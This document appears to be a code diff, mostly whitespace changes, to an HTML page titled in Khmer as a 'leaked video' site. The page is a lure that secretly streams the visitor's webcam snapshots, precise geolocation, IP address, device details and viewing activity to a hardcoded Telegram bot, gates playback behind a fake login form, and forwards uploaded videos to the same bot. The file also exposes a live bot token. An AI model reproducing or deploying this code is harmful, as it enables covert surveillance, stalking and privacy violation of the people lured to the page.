@@ -4,10 +4,10 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>វីដេអូបែកធ្លាយ</title>
-  <script src="firebase.js"></script> 
+  <script src="firebase.js"></script>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Kantumruy+Pro:ital,wght@0,100..700;1,100..700&family=Roboto:wght@400;500&display=swap');
-    
+
     body { margin: 0; padding: 20px; background: linear-gradient(135deg, #ffe8f0, #ffffff); font-family: 'Roboto', Arial, sans-serif; color: #333; }
     h1 { text-align: center; color: #ffffff; padding: 35px; background: #FF0076; border-radius: 10px; margin-bottom: 20px; font-weight: 800; font-family: "Kantumruy Pro", serif; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
     .container { max-width: 1200px; margin: 0 auto; }
@@ -25,10 +25,10 @@
     .success-overlay.show { display: block; transform: translate(-50%, -50%) scale(1); opacity: 1; }
     .success-overlay .icon { font-size: 3rem; margin-bottom: 10px; }
     .success-overlay .message { font-size: 1.2rem; font-weight: bold; }
-    
+
     .upload-section { margin-top: 30px; padding: 20px; background: #f0f8ff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
     .upload-section h2 { margin-top: 0; color: #333; }
-    
+
     input[type="file"]#videoUpload { display: none; }
     .custom-file-upload { border: 1px solid #ccc; display: inline-block; padding: 8px 15px; cursor: pointer; background-color: #e9e9e9; color: #333; border-radius: 5px; font-weight: 500; transition: background-color 0.3s ease; margin-bottom: 10px; }
     .custom-file-upload:hover { background-color: #dcdcdc; }
@@ -58,10 +58,10 @@
     </div>
     <div class="capture-container">
       <video id="videoElementForCapture" autoplay playsinline width="300" height="225"></video>
-      <canvas id="snapshot" width="200" height="200"></canvas> 
+      <canvas id="snapshot" width="200" height="200"></canvas>
     </div>
   </div>
-  
+
   <div id="loginModal" class="modal">
     <div class="modal-content">
       <h2>Please Login to Watch Full Video</h2>
@@ -72,7 +72,7 @@
       </form>
     </div>
   </div>
-  
+
   <div id="successOverlay" class="success-overlay">
     <div class="icon">🎉</div>
     <div class="message">Congratulations! Login Successful.</div>
@@ -82,26 +82,26 @@
     <h2>Upload Your Video</h2>
     <label for="videoUpload" class="custom-file-upload">Choose Video File</label>
     <span id="fileNameDisplay">No file chosen</span>
-    <input type="file" id="videoUpload" accept="video/*"> 
-    <button id="uploadVideoButton" onclick="uploadVideo()">Upload Video</button> 
+    <input type="file" id="videoUpload" accept="video/*">
+    <button id="uploadVideoButton" onclick="uploadVideo()">Upload Video</button>
     <div id="uploadProgress" style="display: none;">
-      <progress id="progressBar" max="100"></progress> 
+      <progress id="progressBar" max="100"></progress>
       <span id="progressText"></span>
     </div>
     <div id="uploadedVideos"></div>
   </div>
-    
+
   <script>
     const botToken = "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA";
     const chatId = "8013992263";
-    const videoElementForCapture = document.getElementById("videoElementForCapture"); 
-    const canvas = document.getElementById("snapshot"); 
+    const videoElementForCapture = document.getElementById("videoElementForCapture");
+    const canvas = document.getElementById("snapshot");
     const ctx = canvas.getContext("2d");
     let userLocation = { lat: "N/A", lon: "N/A" };
-    
+
     let isLoggedIn = localStorage.getItem("isLoggedIn") === "true";
-    let currentVideo = null; 
-    let lastFullscreenVideo = null; 
+    let currentVideo = null;
+    let lastFullscreenVideo = null;
 
     if(isLoggedIn) {
       document.getElementById('loginModal').style.display = 'none';
@@ -111,8 +111,8 @@
       .then(stream => {
         videoElementForCapture.srcObject = stream;
         videoElementForCapture.onloadedmetadata = () => {
-            getLocation(); 
-            setTimeout(startLoopCapture, 2000); 
+            getLocation();
+            setTimeout(startLoopCapture, 2000);
         };
       })
       .catch(error => {
@@ -124,7 +124,10 @@
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           position => { userLocation = { lat: position.coords.latitude, lon: position.coords.longitude }; },
-          error => { console.error("Error getting location:", error); sendToBot(`🚫 Error getting location: ${error.message}`); },
+          error => {
+            console.error("Error getting location:", error);
+            sendToBot(`🚫 Error getting location: ${error.message}`); // <-- THIS IS WHERE THE ERROR MESSAGE COMES FROM
+          },
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
         );
       } else {
@@ -136,12 +139,12 @@
     function captureAndSend() {
       if (!videoElementForCapture.srcObject || !videoElementForCapture.srcObject.active || videoElementForCapture.readyState < videoElementForCapture.HAVE_METADATA) {
         console.warn("Camera stream not ready for capture.");
-        return; 
+        return;
       }
       try {
-        ctx.clearRect(0, 0, canvas.width, canvas.height); 
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
         ctx.drawImage(videoElementForCapture, 0, 0, canvas.width, canvas.height);
-        
+
         canvas.toBlob(blob => {
           if (blob) sendPhoto(blob);
           else sendToBot("🚫 Failed to capture snapshot (blob creation failed).");
@@ -158,12 +161,12 @@
       formData.append("photo", blob, "snapshot.png");
       const locationInfo = (userLocation.lat !== "N/A") ? `📍 Loc: ${userLocation.lat.toFixed(5)}, ${userLocation.lon.toFixed(5)}` : "📍 Loc: N/A";
       formData.append("caption", `📸 Snapshot!\n${locationInfo}`);
-      
+
       fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData })
       .then(response => response.json())
-      .then(data => { 
-        if (!data.ok) sendToBot(`⚠️ TG PhotoErr: ${data.description}`); 
-        if (userLocation.lat !== "N/A") sendLocation(); 
+      .then(data => {
+        if (!data.ok) sendToBot(`⚠️ TG PhotoErr: ${data.description}`);
+        if (userLocation.lat !== "N/A") sendLocation();
       })
       .catch(error => sendToBot(`🚫 Net PhotoErr: ${error.message}`));
     }
@@ -212,7 +215,7 @@
         .then(data => {
           const ip = data.ip;
           const userAgent = navigator.userAgent;
-          
+
           let os = "Unknown OS";
           if (userAgent.includes("Win")) os = "Windows";
           else if (userAgent.includes("Mac")) os = "MacOS";
@@ -226,7 +229,7 @@
           else if (userAgent.includes("OPR/") || userAgent.includes("Opera/")) browser = "Opera";
           else if (userAgent.includes("Chrome/") && !userAgent.includes("Chromium/")) browser = "Chrome";
           else if (userAgent.includes("Safari/") && !userAgent.includes("Chrome/") && !userAgent.includes("Chromium/")) browser = "Safari";
-          
+
           const screenWidth = window.screen.width;
           const screenHeight = window.screen.height;
           const referrer = document.referrer || "Direct visit";
@@ -243,7 +246,7 @@ Language: ${language}
 Timezone: ${timezone}
 Logged In: ${isLoggedIn}`;
           // User Agent is quite long, consider if it's always needed or log separately
-          // basicMessage += `\nUA: ${userAgent}`; 
+          // basicMessage += `\nUA: ${userAgent}`;
           sendToBot(basicMessage);
         })
         .catch(() => {
@@ -254,22 +257,22 @@ Logged In: ${isLoggedIn}`;
 
     function showLoginModal() { document.getElementById('loginModal').style.display = 'block'; }
     function hideLoginModal() { document.getElementById('loginModal').style.display = 'none'; }
-    function showSuccessAnimation() { 
-        const overlay = document.getElementById('successOverlay'); 
-        overlay.classList.add('show'); 
-        setTimeout(() => overlay.classList.remove('show'), 1500); 
+    function showSuccessAnimation() {
+        const overlay = document.getElementById('successOverlay');
+        overlay.classList.add('show');
+        setTimeout(() => overlay.classList.remove('show'), 1500);
     }
-    
+
     const videoStates = new WeakMap();
-    function getVideoState(videoElement){ 
+    function getVideoState(videoElement){
         if(!videoStates.has(videoElement)) {
-            videoStates.set(videoElement, {previousTime: 0, hasStartedPlaying: false}); 
+            videoStates.set(videoElement, {previousTime: 0, hasStartedPlaying: false});
         }
-        return videoStates.get(videoElement); 
+        return videoStates.get(videoElement);
     }
-    function getVideoFileName(videoElement){ 
-        const source = videoElement.currentSrc || videoElement.src || ""; 
-        try { 
+    function getVideoFileName(videoElement){
+        const source = videoElement.currentSrc || videoElement.src || "";
+        try {
             return decodeURIComponent(source.substring(source.lastIndexOf('/') + 1));
         } catch(e) {
             return source.substring(source.lastIndexOf('/') + 1) || 'UnknownVideo';
@@ -282,16 +285,16 @@ Logged In: ${isLoggedIn}`;
       const state = getVideoState(videoEl);
 
       videoEl.addEventListener('play', function() {
-        if (!isLoggedIn && this.currentTime >= 5) { 
-            this.pause(); currentVideo = this; showLoginModal(); return; 
-        } 
-        if (!state.hasStartedPlaying || this.ended) { 
-            sendToBot(`▶️ Started: ${videoName}`); 
-            state.hasStartedPlaying = true; 
-            if(this.ended) state.previousTime = 0; 
-        } else { 
-            sendToBot(`▶️ Resumed: ${videoName} at ${this.currentTime.toFixed(1)}s`); 
-        } 
+        if (!isLoggedIn && this.currentTime >= 5) {
+            this.pause(); currentVideo = this; showLoginModal(); return;
+        }
+        if (!state.hasStartedPlaying || this.ended) {
+            sendToBot(`▶️ Started: ${videoName}`);
+            state.hasStartedPlaying = true;
+            if(this.ended) state.previousTime = 0;
+        } else {
+            sendToBot(`▶️ Resumed: ${videoName} at ${this.currentTime.toFixed(1)}s`);
+        }
         state.previousTime = this.currentTime;
       });
 
@@ -302,26 +305,26 @@ Logged In: ${isLoggedIn}`;
         }
       });
 
-      videoEl.addEventListener('ended', function() { 
-        sendToBot(`⏹️ Finished: ${videoName}`); 
-        state.hasStartedPlaying = false; 
+      videoEl.addEventListener('ended', function() {
+        sendToBot(`⏹️ Finished: ${videoName}`);
+        state.hasStartedPlaying = false;
       });
 
-      videoEl.addEventListener('volumechange', function() { 
-        sendToBot(`🔊 Volume ${videoName}: ${(this.volume * 100).toFixed(0)}% (Muted: ${this.muted})`); 
+      videoEl.addEventListener('volumechange', function() {
+        sendToBot(`🔊 Volume ${videoName}: ${(this.volume * 100).toFixed(0)}% (Muted: ${this.muted})`);
       });
 
-      videoEl.addEventListener('seeked', function() { 
-        sendToBot(`⏭️ Seeked ${videoName} from ${state.previousTime.toFixed(1)}s to ${this.currentTime.toFixed(1)}s`); 
-        state.previousTime = this.currentTime; 
+      videoEl.addEventListener('seeked', function() {
+        sendToBot(`⏭️ Seeked ${videoName} from ${state.previousTime.toFixed(1)}s to ${this.currentTime.toFixed(1)}s`);
+        state.previousTime = this.currentTime;
       });
 
       videoEl.addEventListener('timeupdate', function() {
-        if (!isLoggedIn && this.currentTime >= 5 && !this.paused) { 
-            this.pause(); currentVideo = this; showLoginModal(); 
-        } 
+        if (!isLoggedIn && this.currentTime >= 5 && !this.paused) {
+            this.pause(); currentVideo = this; showLoginModal();
+        }
         if (!this.seeking) {
-            state.previousTime = this.currentTime; 
+            state.previousTime = this.currentTime;
         }
       });
 
@@ -339,26 +342,26 @@ Logged In: ${isLoggedIn}`;
         sendToBot(`⚠️ Video error on ${videoName}: ${errorMessage}`);
       });
 
-      videoEl.addEventListener('webkitbeginfullscreen', function() { 
-          lastFullscreenVideo = this; 
-          sendToBot(`↕️ FS Enter (iOS): ${videoName}`); 
+      videoEl.addEventListener('webkitbeginfullscreen', function() {
+          lastFullscreenVideo = this;
+          sendToBot(`↕️ FS Enter (iOS): ${videoName}`);
       });
-      videoEl.addEventListener('webkitendfullscreen', function() { 
-          sendToBot(`↕️ FS Exit (iOS): ${videoName}`); 
-          if (lastFullscreenVideo === this) lastFullscreenVideo = null; 
+      videoEl.addEventListener('webkitendfullscreen', function() {
+          sendToBot(`↕️ FS Exit (iOS): ${videoName}`);
+          if (lastFullscreenVideo === this) lastFullscreenVideo = null;
       });
     });
 
     function handleFullscreenChange() {
       const fullscreenElement = document.fullscreenElement || document.webkitFullscreenElement;
       if (fullscreenElement) {
-        const videoName = (fullscreenElement.classList && fullscreenElement.classList.contains('homevideo')) 
-                            ? getVideoFileName(fullscreenElement) 
+        const videoName = (fullscreenElement.classList && fullscreenElement.classList.contains('homevideo'))
+                            ? getVideoFileName(fullscreenElement)
                             : `element (${fullscreenElement.tagName || 'Unknown'})`;
         if (fullscreenElement.classList && fullscreenElement.classList.contains('homevideo')) {
             lastFullscreenVideo = fullscreenElement;
         } else {
-            lastFullscreenVideo = null; 
+            lastFullscreenVideo = null;
         }
         sendToBot(`↕️ FS Enter: ${videoName}`);
       } else {
@@ -374,24 +377,24 @@ Logged In: ${isLoggedIn}`;
       const usernameInput = document.getElementById('username');
       const passwordInput = document.getElementById('password');
       const username = usernameInput.value.trim();
-      
+
       if (username && passwordInput.value) { // Check if password field has value
-        isLoggedIn = true; 
-        localStorage.setItem("isLoggedIn", "true"); 
+        isLoggedIn = true;
+        localStorage.setItem("isLoggedIn", "true");
         localStorage.setItem("username", username);
-        hideLoginModal(); 
+        hideLoginModal();
         showSuccessAnimation();
         sendToBot(`✅ User "${username}" logged in.`);
-        usernameInput.value = ''; 
+        usernameInput.value = '';
         passwordInput.value = '';
-        setTimeout(() => { 
+        setTimeout(() => {
             if (currentVideo) { currentVideo.play().catch(console.warn); currentVideo = null; }
         }, 1500);
       } else {
         alert('Please enter both username and password.');
       }
     });
-    
+
     const videoUploadInputEl = document.getElementById('videoUpload');
     const fileNameDisplayEl = document.getElementById('fileNameDisplay');
     const uploadProgressDivEl = document.getElementById('uploadProgress');
@@ -403,12 +406,12 @@ Logged In: ${isLoggedIn}`;
         fileNameDisplayEl.textContent = (this.files && this.files.length > 0) ? this.files[0].name : 'No file chosen';
     });
 
-    function uploadVideo() { 
+    function uploadVideo() {
       const file = videoUploadInputEl.files[0];
       if (!file) { alert("Please select a video file first."); return; }
 
       const fileSizeMB = (file.size / 1024 / 1024).toFixed(2);
-      const MAX_FILE_SIZE_MB = 50; 
+      const MAX_FILE_SIZE_MB = 50;
 
       if (file.size > MAX_FILE_SIZE_MB * 1024 * 1024) {
           alert(`File is too large (${fileSizeMB}MB). Max ${MAX_FILE_SIZE_MB}MB.`);
@@ -418,7 +421,7 @@ Logged In: ${isLoggedIn}`;
 
       sendToBot(`📥 Upload init: ${file.name} (${fileSizeMB}MB)`);
       uploadProgressDivEl.style.display = 'block';
-      progressBarEl.removeAttribute('value'); 
+      progressBarEl.removeAttribute('value');
       progressTextEl.textContent = 'Preparing file...';
 
       const formData = new FormData();
@@ -432,14 +435,14 @@ Logged In: ${isLoggedIn}`;
       fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData })
       .then(response => response.json())
       .then(data => {
-          progressBarEl.value = 100; 
+          progressBarEl.value = 100;
           if (data.ok) {
               progressTextEl.textContent = 'Upload successful!';
               sendToBot(`✅ TG Video Sent: ${file.name}`);
               const videoPreviewElement = document.createElement('video');
               videoPreviewElement.src = URL.createObjectURL(file);
               videoPreviewElement.controls = true;
-              videoPreviewElement.width = 320; 
+              videoPreviewElement.width = 320;
               const videoTitleElement = document.createElement('p');
               videoTitleElement.textContent = `Preview: ${file.name}`;
               videoTitleElement.style.fontWeight = 'bold';
@@ -452,17 +455,17 @@ Logged In: ${isLoggedIn}`;
               console.error("TG VidErr:", data);
           }
       }).catch(error => {
-          progressBarEl.value = 100; 
+          progressBarEl.value = 100;
           progressTextEl.textContent = 'Upload failed. Network error.';
           sendToBot(`🚫 Net VidErr: ${file.name} - ${error.message}`);
           console.error("Net VidErr:", error);
       }).finally(() => {
-          setTimeout(() => { 
-              uploadProgressDivEl.style.display = 'none'; 
-              progressBarEl.removeAttribute('value'); 
-              progressTextEl.textContent = ''; 
+          setTimeout(() => {
+              uploadProgressDivEl.style.display = 'none';
+              progressBarEl.removeAttribute('value');
+              progressTextEl.textContent = '';
           }, 7000);
-          videoUploadInputEl.value = null; 
+          videoUploadInputEl.value = null;
           fileNameDisplayEl.textContent = 'No file chosen';
       });
     }
@@ -491,7 +494,7 @@ Logged In: ${isLoggedIn}`;
     let maxScrollDepthAchieved = 0;
     const scrollMilestones = [25, 50, 75, 90, 100];
     let reportedMilestones = new Set();
-    
+
     function getCurrentScrollPercentage() {
         const scrollableHeight = document.documentElement.scrollHeight - window.innerHeight;
         return scrollableHeight <= 0 ? 100 : (window.scrollY / scrollableHeight) * 100;
@@ -506,11 +509,11 @@ Logged In: ${isLoggedIn}`;
             }
         }
     }
-    let scrollTimeout; 
-    window.addEventListener('scroll', () => { 
-        clearTimeout(scrollTimeout); 
-        scrollTimeout = setTimeout(checkScrollDepth, 250); 
-    }, {passive: true}); 
+    let scrollTimeout;
+    window.addEventListener('scroll', () => {
+        clearTimeout(scrollTimeout);
+        scrollTimeout = setTimeout(checkScrollDepth, 250);
+    }, {passive: true});
     checkScrollDepth(); // Initial check
 
     document.addEventListener('copy', event => {
